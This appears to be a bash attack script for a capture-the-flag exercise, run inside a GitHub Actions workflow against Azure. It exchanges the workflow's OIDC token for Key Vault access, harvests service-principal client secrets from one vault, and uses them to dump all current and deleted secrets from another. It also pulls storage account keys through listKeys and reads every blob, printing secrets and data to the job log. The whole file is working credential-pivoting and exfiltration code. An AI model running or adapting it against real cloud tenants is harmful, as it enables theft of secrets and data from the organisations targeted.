#!/usr/bin/env bash
# CTF DF26 v7: per-SP vault tokens -> kv-tbl-sec secrets (+deleted); SP listKeys backup/archive.
set +e
T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID; S=$AZURE_SUBSCRIPTION_ID
M=https://management.azure.com
PV=https://kv-tbl-prod-x3euoz.vault.azure.net
SV=https://kv-tbl-sec-x3euoz.vault.azure.net
FL='DF26\{[^}]\{0,200}\}'
OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
fed(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2" | jq -r '.access_token // empty'; }
spn(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
VT=$(fed "$C" "https://vault.azure.net/.default")
echo "===== CTX run=$GITHUB_RUN_ID ====="
for u in $(curl -s "$PV/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value[].id'); do
  w=$(curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value // empty')
  aid=$(echo "$w" | jq -r '.appId // empty'); as=$(echo "$w" | jq -r '.clientSecret // empty')
  [ -z "$aid" ] && continue
  nm=$(basename "$u")
  K=$(spn "$aid" "$as" "https://vault.azure.net/.default")
  echo "##### $nm vaulttok=${#K}"
  [ ${#K} -lt 50 ] && continue
  L=$(curl -s "$SV/secrets?api-version=7.4" -H "Authorization: Bearer $K")
  echo "SECLIST: $(echo "$L" | head -c 900)"
  for x in $(echo "$L" | jq -r '.value[]?.id // empty'); do
    echo "--- SEC $nm $(basename "$x")"
    v=$(curl -s "$x?api-version=7.4" -H "Authorization: Bearer $K")
    echo "$v" | jq -r '.value // .' | head -c 800; echo
    echo "$v" | grep -aoE "$FL"
  done
  D2=$(curl -s "$SV/deleted-secrets?api-version=7.4" -H "Authorization: Bearer $K")
  for x in $(echo "$D2" | jq -r '.value[]?.id // empty'); do
    echo "--- SECDEL $nm $x"
    curl -s "$x?api-version=7.4" -H "Authorization: Bearer $K" | jq -r '.value // .' | head -c 800; echo
  done
  A=$(spn "$aid" "$as" "https://management.azure.com/.default")
  [ ${#A} -lt 50 ] && continue
  for rg in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
    for sa in sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblappcfgprodx3euoz sttblreportprod8s42x5; do
      R=$(curl -s -X POST -H "Authorization: Bearer $A" -H 'Content-Length: 0' "$M/subscriptions/$S/resourceGroups/$rg/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-01-01")
      KEY=$(echo "$R" | jq -r '.keys[0].value // empty')
      [ -n "$KEY" ] || continue
      echo "##### KEY $sa via $nm"
      ka(){ local d; d=$(date -u +"%a, %d %b %Y %H:%M:%S GMT"); curl -s "$1" -H 'x-ms-version: 2021-08-06' -H "x-ms-date: $d" -H "Authorization: SharedKey $sa:$KEY"; }
      for cont in $(ka "https://$sa.blob.core.windows.net/?comp=list" | grep -oE '<Container><Name>[^<]+' | sed 's/.*<Name>//'); do
        echo "CONT $cont"
        for blob in $(ka "https://$sa.blob.core.windows.net/$cont?restype=container&comp=list" | grep -oE '<Blob><Name>[^<]+' | sed 's/.*<Name>//'); do
          echo "BLOB $cont/$blob"
          data=$(ka "https://$sa.blob.core.windows.net/$cont/$blob")
          echo "$data" | head -c 900; echo
          echo "$data" | grep -aoE "$FL"
        done
      done
    done
  done
done
echo DONE-V7
